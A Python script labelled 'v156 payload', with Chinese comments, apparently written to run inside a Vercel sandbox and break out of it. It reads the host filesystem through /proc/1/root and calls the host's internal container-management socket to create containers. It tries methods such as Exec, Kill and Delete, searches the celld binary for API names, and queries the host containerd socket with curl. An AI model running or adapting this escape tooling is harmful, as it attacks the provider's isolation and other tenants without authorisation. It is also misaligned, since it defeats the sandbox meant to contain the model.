# -*- coding: utf-8 -*-
"""v156 payload: Create('sandbox') 成功容器后续操作 + ContainersService 方法枚举
输出 /vercel/sandbox/v156c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v156c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=420):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1200] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def bin_grep(path, kws, max_size=400 * 1024 * 1024, max_hits=80, ctx=120):
    try:
        size = os.path.getsize(path)
        log('BIN %s size=%d' % (path, size))
        if size > max_size:
            return
        data = open(path, 'rb').read()
        hits = 0
        for kw in kws:
            if hits >= max_hits:
                break
            for m in re.finditer(kw, data):
                s = max(0, m.start() - ctx)
                seg = data[s:m.end() + ctx]
                printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
                if printable * 10 < len(seg) * 4:
                    continue
                log('BIN %s @0x%x: %r' % (kw, m.start(), seg))
                hits += 1
                if hits >= max_hits:
                    break
        log('BIN %s done hits=%d' % (path, hits))
    except Exception as e:
        log('BIN EXC %s %s' % (path, e))


# ============ 1: Create('sandbox') + 后续方法探测 ============
log('=== 1 create+methods ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS, json.dumps({'drive_id': 'sandbox'}).encode(), t=8)
log('Create sandbox -> %s %r' % (st, pay))
cid = None
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
if m:
    cid = m.group(1).decode()
    log('containerId=%s' % cid)

# 方法枚举: 每个方法用空 body + containerId body 各试一次
methods = ['Start', 'Stop', 'Delete', 'Get', 'List', 'Update', 'Exec', 'Wait',
           'Status', 'Inspect', 'Kill', 'Pause', 'Resume', 'CreateSnapshot',
           'Restore', 'Describe', 'GetContainer', 'ListContainers', 'Exists', 'Resize']
for meth in methods:
    for body in [b'{}', json.dumps({'container_id': cid} if cid else {}).encode(),
                 json.dumps({'id': cid} if cid else {}).encode()]:
        st2, pay2 = raw_req(CELL, '%s/%s' % (CTRS, meth), body, t=4)
        if '404' not in st2 and 'NOT FOUND' not in st2.upper() and 'EXC' not in st2:
            log('METH %s body=%r -> %s %r' % (meth, body[:60], st2, pay2[:300]))
            break
        # 404 只打一次
    else:
        log('METH %s -> 404 (missing)' % meth)

# ============ 2: ContainersService 方法名 (celld 二进制) ============
log('=== 2 bin methods ===')
bin_grep(R + '/opt/vercel/celld',
         [rb'ContainersService/[A-Za-z]+', rb'containers\.v1\.[A-Za-z]+', rb'ContainersService',
          rb'cell/api/containers', rb'GetContainer\b', rb'ListContainers', rb'WaitContainer',
          rb'StartContainer', rb'StopContainer', rb'DeleteContainer', rb'ExecContainer'],
         max_hits=60, ctx=100)

# ============ 3: containerd List 对比 ============
log('=== 3 ctr list ===')
try:
    import subprocess
    tmp = '/vercel/sandbox/curl_req.bin'
    open(tmp, 'wb').write(b'\x00\x00\x00\x00\x00')
    hdr = '/vercel/sandbox/curl_hdr.txt'
    csock = R + '/run/containerd/containerd.sock'
    cmd = ['curl', '-sS', '--max-time', '6', '--http2-prior-knowledge',
           '--unix-socket', csock, '-X', 'POST',
           '-H', 'Content-Type: application/grpc', '-H', 'containerd-namespace: default',
           '-D', hdr, '--data-binary', '@%s' % tmp,
           'http://unix/containerd.services.containers.v1.Containers/List']
    r = subprocess.run(cmd, capture_output=True, timeout=8)
    out = r.stdout
    log('CTR List len=%d' % len(out))
    for m in re.finditer(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', out):
        log('CTR uuid %s' % m.group().decode())
    log('CTR raw: %r' % out[:800])
except Exception as e:
    log('ctr list EXC %s' % e)

log('V156_DONE')
f.close()
